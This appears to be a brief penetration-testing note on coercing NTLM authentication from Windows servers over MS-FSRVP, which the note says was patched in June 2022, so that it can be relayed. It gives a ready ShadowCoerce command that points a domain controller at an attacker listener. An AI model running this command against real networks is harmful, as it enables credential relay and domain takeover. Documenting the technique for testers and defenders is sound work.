---
title: NTLM Relay from FSRV
---

[[notes/ad/ntlm-relay-source]] as domain user from servers trough [[notes/network/msrpc]] *File Server Remote VSS Protocol* ([MS-FSRVP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/)).
This was patched in June 2022.

[[notes/ad/ntlm-relay-from-smb|Coerce authentication from SMB]].

=== "[ShadowCoerce](https://github.com/shutdownrepo/shadowcoerce)"
    ~~~ bash
    ./shadowcoerce.py -d corp.local -u jdoe -p 'passw0rd' $lhost dc01.corp.local
    ~~~
